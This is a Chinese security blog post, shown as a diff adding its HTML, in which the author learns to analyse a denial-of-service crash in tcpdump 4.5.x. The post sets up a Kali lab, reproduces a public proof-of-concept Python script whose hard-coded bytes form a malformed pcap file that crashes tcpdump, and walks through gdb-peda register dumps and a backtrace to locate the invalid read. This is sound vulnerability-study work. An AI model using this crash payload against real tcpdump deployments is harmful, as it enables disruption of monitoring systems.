@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="tea9">
+
+
+    <meta name="subtitle" content="加油">
+
+
+    <meta name="description" content="心中有光の孩子">
+
+
+    <meta name="keywords" content="tea9,tea9的博客,开发,android,安全,android安全,android逆向,移动安全,frida,xposed,ollvm,查查查,茶茶茶,茶茶,茶姐姐,茶姐姐博客,茶茶茶博客,茶茶blog">
+
+
+<title>tcpdump4.5.2拒绝服务漏洞 | tea9のblog</title>
+
+
+
+    <link rel="icon" href="/image/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Tea9&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Tea9&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">tcpdump4.5.2拒绝服务漏洞</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">tea9</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">二月 17, 2023&nbsp;&nbsp;18:53:29</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Security/">Security</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="二进制step1-TCPDUMP-4-5-2-拒绝服务漏洞分析"><a href="#二进制step1-TCPDUMP-4-5-2-拒绝服务漏洞分析" class="headerlink" title="[二进制step1]TCPDUMP 4.5.2 拒绝服务漏洞分析"></a>[二进制step1]TCPDUMP 4.5.2 拒绝服务漏洞分析</h2><p>学习来源：</p>
+<p><a target="_blank" rel="noopener" href="https://whereisk0shl.top/post/2016-10-23-1">https://whereisk0shl.top/post/2016-10-23-1</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-261984.htm">https://bbs.kanxue.com/thread-261984.htm</a></p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><strong>kali-linux-2022.4-vmware-i386 要x86的</strong></p>
+<p>下载链接</p>
+<p><a target="_blank" rel="noopener" href="https://cdimage.kali.org/kali-2022.4/kali-linux-2022.4-vmware-i386.7z">https://cdimage.kali.org/kali-2022.4/kali-linux-2022.4-vmware-i386.7z</a></p>
+<p>之前用的这个Kali-Linux-2019.4-vmware-amd64安装一直报错，也有可能是网络的原因，下午换了镜像换了一个网络之后，环境和安装都很顺利</p>
+<p>剩下步骤就按照参考的来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 卸载默认安装的tcpdump</span><br><span class="line">apt-get --purge remove tcpdump  </span><br><span class="line"># 安装依赖包</span><br><span class="line">apt install flex</span><br><span class="line">apt install bison</span><br><span class="line"># 安装libpcap</span><br><span class="line">wget http://www.tcpdump.org/release/libpcap-1.5.3.tar.gz</span><br><span class="line">tar -zxvf libpcap-1.5.3.tar.gz</span><br><span class="line">cd libpcap-1.5.3</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"># 安装tcpdump</span><br><span class="line">wget http://www.tcpdump.org/release/tcpdump-4.5.1.tar.gz</span><br><span class="line">tar -zxvf tcpdump-4.5.1.tar.gz</span><br><span class="line">cd tcpdump-4.5.1</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"># 验证安装</span><br><span class="line">tcpdump --version</span><br></pre></td></tr></table></figure>
+
+<p>因为全新的环境没有调试工具记录下安装gdb和gdbpeda</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gdb</span><br><span class="line">下载</span><br><span class="line">wget http://ftp.gnu.org/gnu/gdb/gdb-11.2.tar.gz</span><br><span class="line">解压</span><br><span class="line">tar -zxvf gdb-11.2.tar.gz</span><br><span class="line">生成makefile文件</span><br><span class="line">./configure</span><br><span class="line">检查文件</span><br><span class="line">make</span><br><span class="line">安装</span><br><span class="line">sudo make install</span><br><span class="line">验证</span><br><span class="line">gdb -v</span><br><span class="line"></span><br><span class="line">peda</span><br><span class="line">git clone https://github.com/longld/peda.git ~/peda </span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
+
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>poc.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: tcpdump 4.5.1 Access Violation Crash</span><br><span class="line"># Date: 31st May 2016</span><br><span class="line"># Exploit Author: David Silveiro</span><br><span class="line"># Vendor Homepage: http://www.tcpdump.org</span><br><span class="line"># Software Link: http://www.tcpdump.org/release/tcpdump-4.5.1.tar.gz</span><br><span class="line"># Version: 4.5.1</span><br><span class="line"># Tested on: Ubuntu 14 LTS</span><br><span class="line"> </span><br><span class="line">from subprocess import call</span><br><span class="line">from shlex import split</span><br><span class="line">from time import sleep</span><br><span class="line"> </span><br><span class="line">def crash():</span><br><span class="line"> </span><br><span class="line">    command = &#x27;tcpdump -r crash&#x27;</span><br><span class="line"> </span><br><span class="line">    buffer     =   &#x27;\xd4\xc3\xb2\xa1\x02\x00\x04\x00\x00\x00\x00\xf5\xff&#x27;</span><br><span class="line">    buffer     +=  &#x27;\x00\x00\x00I\x00\x00\x00\xe6\x00\x00\x00\x00\x80\x00&#x27;</span><br><span class="line">    buffer     +=  &#x27;\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00&lt;\x9c7@\xff\x00&#x27;</span><br><span class="line">    buffer     +=  &#x27;\x06\xa0r\x7f\x00\x00\x01\x7f\x00\x00\xec\x00\x01\xe0\x1a&#x27;</span><br><span class="line">    buffer     +=  &quot;\x00\x17g+++++++\x85\xc9\x03\x00\x00\x00\x10\xa0&amp;\x80\x18\&#x27;&quot;</span><br><span class="line">    buffer     +=  &quot;xfe$\x00\x01\x00\x00@\x0c\x04\x02\x08\n&#x27;, &#x27;\x00\x00\x00\x00&quot;</span><br><span class="line">    buffer     +=  &#x27;\x00\x00\x00\x00\x01\x03\x03\x04&#x27;</span><br><span class="line"> </span><br><span class="line">    with open(&#x27;crash&#x27;, &#x27;w+b&#x27;) as file:</span><br><span class="line">        file.write(buffer)</span><br><span class="line"> </span><br><span class="line">    try:</span><br><span class="line">        call(split(command))</span><br><span class="line">        print(&quot;Exploit successful!             &quot;)</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;Error: Something has gone wrong!&quot;)</span><br><span class="line"> </span><br><span class="line">def main():</span><br><span class="line"> </span><br><span class="line">    print(&quot;Author:   David Silveiro                           &quot;)</span><br><span class="line">    print(&quot;   tcpdump version 4.5.1 Access Violation Crash    &quot;)</span><br><span class="line"> </span><br><span class="line">    sleep(2)</span><br><span class="line">    crash()</span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>生成crash文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 poc.py</span><br><span class="line"></span><br><span class="line">Exploit successful!  </span><br></pre></td></tr></table></figure>
+
+<p>crash文件内容</p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/50/1.png"></p>
+<p>gdb执行tcpdump 然后执行run -r crash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/tcpdump-dos# gdb tcpdump</span><br><span class="line"> </span><br><span class="line">gdb-peda$ run -r crash</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x7ffef2b3 </span><br><span class="line">EBX: 0x51cff4 --&gt; 0x11ce70 </span><br><span class="line">ECX: 0x2e (&#x27;.&#x27;)</span><br><span class="line">EDX: Cannot access memory address</span><br><span class="line">ESI: 0x5 </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0xbfffdbdd (&quot;......&quot;)</span><br><span class="line">ESP: 0xbfffdb60 --&gt; 0xf375846 </span><br><span class="line">EIP: 0x41a6cc (&lt;hex_and_ascii_print_with_offset+156&gt;:   movzx  esi,BYTE PTR [edx+0x1])</span><br><span class="line">EFLAGS: 0x10217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x41a6bf &lt;hex_and_ascii_print_with_offset+143&gt;:      mov    eax,DWORD PTR [esp+0x14]</span><br><span class="line">   0x41a6c3 &lt;hex_and_ascii_print_with_offset+147&gt;:      cmp    eax,0xffffffff</span><br><span class="line">   0x41a6c6 &lt;hex_and_ascii_print_with_offset+150&gt;:      je     0x41a7c7 &lt;hex_and_ascii_print_with_offset+407&gt;</span><br><span class="line">=&gt; 0x41a6cc &lt;hex_and_ascii_print_with_offset+156&gt;:      movzx  esi,BYTE PTR [edx+0x1]</span><br><span class="line">   0x41a6d0 &lt;hex_and_ascii_print_with_offset+160&gt;:      movzx  edi,BYTE PTR [edx]</span><br><span class="line">   0x41a6d3 &lt;hex_and_ascii_print_with_offset+163&gt;:      add    edx,0x2</span><br><span class="line">   0x41a6d6 &lt;hex_and_ascii_print_with_offset+166&gt;:      sub    esp,0xc</span><br><span class="line">   0x41a6d9 &lt;hex_and_ascii_print_with_offset+169&gt;:      mov    DWORD PTR [esp+0x2c],edx</span><br><span class="line">[------------------------------------stack-------------------------------------]                                                                          </span><br><span class="line">0000| 0xbfffdb60 --&gt; 0xf375846 </span><br><span class="line">0004| 0xbfffdb64 --&gt; 0xb7fc34a0 --&gt; 0xb7c00000 --&gt; 0x464c457f </span><br><span class="line">0008| 0xbfffdb68 --&gt; 0xb7c09934 --&gt; 0x0 </span><br><span class="line">0012| 0xbfffdb6c --&gt; 0xbfffdbc3 --&gt; 0x30303000 (&#x27;&#x27;)</span><br><span class="line">0016| 0xbfffdb70 --&gt; 0x5 </span><br><span class="line">0020| 0xbfffdb74 --&gt; 0x7ffef2b3 </span><br><span class="line">0024| 0xbfffdb78 --&gt; 0x0 </span><br><span class="line">0028| 0xbfffdb7c --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]                                                                          </span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">hex_and_ascii_print_with_offset (ident=0x4aadef &quot;\n\t&quot;, cp=0x610000 &lt;error: Cannot access memory at address 0x610000&gt;, length=0xfffffff3, oset=0x21a80) at ./print-ascii.c:90</span><br><span class="line">90                      s1 = *cp++;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>执行bt命令查看函数调用栈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bt</span><br><span class="line">#0  hex_and_ascii_print_with_offset (ident=0x4aadef &quot;\n\t&quot;, </span><br><span class="line">    cp=0x610000 &lt;error: Cannot access memory at address 0x610000&gt;, </span><br><span class="line">    length=0xfffffff3, oset=0x21a80) at ./print-ascii.c:90</span><br><span class="line">#1  0x0041a8d6 in hex_and_ascii_print (ident=0x4aadef &quot;\n\t&quot;, </span><br><span class="line">    cp=0x5ee575 &quot;\377\377\377\347\067\020\340\377\377\377\377\350&#x27;\017\360\377\377\377\377\351\026\362\340\377\377\377\377\352\006\361\360\377\377\377\377\352\366\324\340\377\377\377\377\353\346\323\360\377\377\377\377\354\340\021&quot;, length=0xfffffff3) at ./print-ascii.c:127</span><br><span class="line">#2  0x0046dd13 in ndo_default_print (ndo=0x5ea9c0 &lt;Gndo&gt;, </span><br><span class="line">    bp=0x5ee575 &quot;\377\377\377\347\067\020\340\377\377\377\377\350&#x27;\017\360\377\377\377\377\351\026\362\340\377\377\377\377\352\006\361\360\377\377\377\377\352\366\324\340\377\377\377\377\353\346\323\360\377\377\377\377\354\340\021&quot;, length=0xfffffff3) at ./tcpdump.c:2053</span><br><span class="line">#3  0x0041850c in ieee802_15_4_if_print (ndo=0x5ea9c0 &lt;Gndo&gt;, h=0xbfffde10, </span><br><span class="line">    p=&lt;optimized out&gt;) at ./print-802_15_4.c:180</span><br><span class="line">#4  0x0046e348 in print_packet (user=0xbfffdef0 &quot;\300\251^&quot;, h=0xbfffde10, </span><br><span class="line">    sp=0x5ee560 &quot;@\377&quot;) at ./tcpdump.c:1950</span><br><span class="line">#5  0x004905ef in pcap_offline_read (p=0x5ee350, cnt=0xffffffff, </span><br><span class="line">    callback=0x46e2f0 &lt;print_packet&gt;, user=0xbfffdef0 &quot;\300\251^&quot;)</span><br><span class="line">    at ./savefile.c:409</span><br><span class="line">#6  0x004808b3 in pcap_loop (p=0x5ee350, cnt=0xffffffff, </span><br><span class="line">    callback=0x46e2f0 &lt;print_packet&gt;, user=0xbfffdef0 &quot;\300\251^&quot;)</span><br><span class="line">    at ./pcap.c:849</span><br><span class="line">#7  0x004119b5 in main (argc=&lt;optimized out&gt;, argv=0xbffff0f4)</span><br><span class="line">    at ./tcpdump.c:1569</span><br><span class="line">#8  0xb7c23295 in ?? () from /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">#9  0xb7c23358 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">#10 0x00412747 in _start ()</span><br><span class="line">gdb-peda$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>函数调用过程</p>
+<p>_start ()</p>
+<p>__libc_start_main（） libc.so 6行</p>
+<p> main   tcpdump.c:1569</p>
+<p>pcap_loop   pcap.c:849</p>
+<p>pcap_offline_read     savefile.c:409</p>
+<p>print_packet    tcpdump.c:1950</p>
+<p>ieee802_15_4_if_print    print-802_15_4.c:180</p>
+<p>ndo_default_print    .&#x2F;tcpdump.c:2053</p>
+<p>hex_and_ascii_print  .&#x2F;print-ascii.c:127</p>
+<p>hex_and_ascii_print_with_offset print-ascii.c:90 </p>
+<p>漏洞是打印时引用了非法地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ s</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x7ffef2b3 </span><br><span class="line">EBX: 0x51cff4 --&gt; 0x11ce70 </span><br><span class="line">ECX: 0x2e (&#x27;.&#x27;)</span><br><span class="line">EDX: Cannot access memory address</span><br><span class="line">ESI: 0x5 </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0xbfffdbdd (&quot;......&quot;)</span><br><span class="line">ESP: 0xbfffdb60 --&gt; 0xf375846 </span><br><span class="line">EIP: 0x41a6cc (&lt;hex_and_ascii_print_with_offset+156&gt;:   movzx  esi,BYTE PTR [edx+0x1])</span><br><span class="line">EFLAGS: 0x10217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x41a6bf &lt;hex_and_ascii_print_with_offset+143&gt;:      mov    eax,DWORD PTR [esp+0x14]</span><br><span class="line">   0x41a6c3 &lt;hex_and_ascii_print_with_offset+147&gt;:      cmp    eax,0xffffffff</span><br><span class="line">   0x41a6c6 &lt;hex_and_ascii_print_with_offset+150&gt;:      je     0x41a7c7 &lt;hex_and_ascii_print_with_offset+407&gt;</span><br><span class="line">=&gt; 0x41a6cc &lt;hex_and_ascii_print_with_offset+156&gt;:      movzx  esi,BYTE PTR [edx+0x1]</span><br><span class="line">   0x41a6d0 &lt;hex_and_ascii_print_with_offset+160&gt;:      movzx  edi,BYTE PTR [edx]</span><br><span class="line">   0x41a6d3 &lt;hex_and_ascii_print_with_offset+163&gt;:      add    edx,0x2</span><br><span class="line">   0x41a6d6 &lt;hex_and_ascii_print_with_offset+166&gt;:      sub    esp,0xc</span><br><span class="line">   0x41a6d9 &lt;hex_and_ascii_print_with_offset+169&gt;:      mov    DWORD PTR [esp+0x2c],edx</span><br><span class="line">[------------------------------------stack-------------------------------------]                                                                          </span><br><span class="line">0000| 0xbfffdb60 --&gt; 0xf375846 </span><br><span class="line">0004| 0xbfffdb64 --&gt; 0xb7fc34a0 --&gt; 0xb7c00000 --&gt; 0x464c457f </span><br><span class="line">0008| 0xbfffdb68 --&gt; 0xb7c09934 --&gt; 0x0 </span><br><span class="line">0012| 0xbfffdb6c --&gt; 0xbfffdbc3 --&gt; 0x30303000 (&#x27;&#x27;)</span><br><span class="line">0016| 0xbfffdb70 --&gt; 0x5 </span><br><span class="line">0020| 0xbfffdb74 --&gt; 0x7ffef2b3 </span><br><span class="line">0024| 0xbfffdb78 --&gt; 0x0 </span><br><span class="line">0028| 0xbfffdb7c --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]                                                                          </span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">hex_and_ascii_print_with_offset (ident=0x4aadef &quot;\n\t&quot;, cp=0x610000 &lt;error: Cannot access memory at address 0x610000&gt;, length=0xfffffff3, oset=0x21a80) at ./print-ascii.c:90</span><br><span class="line">90                      s1 = *cp++;</span><br><span class="line">gdb-peda$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>tea9</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://tea9.xyz/post/2614552297.html">http://tea9.xyz/post/2614552297.html</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2017-2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"># 二进制</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/post/3647987720.html">渗透测试面试题目</a>
+            
+        </section>
+    </article>
+</div>
+
+
+
+
+            </div>
+            <footer id="footer" class="footer">
+ 
+    <div class="copyright">
+        <span>© tea9 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+   
+</footer>
+
+    </div>
+</body>
+
+</html>
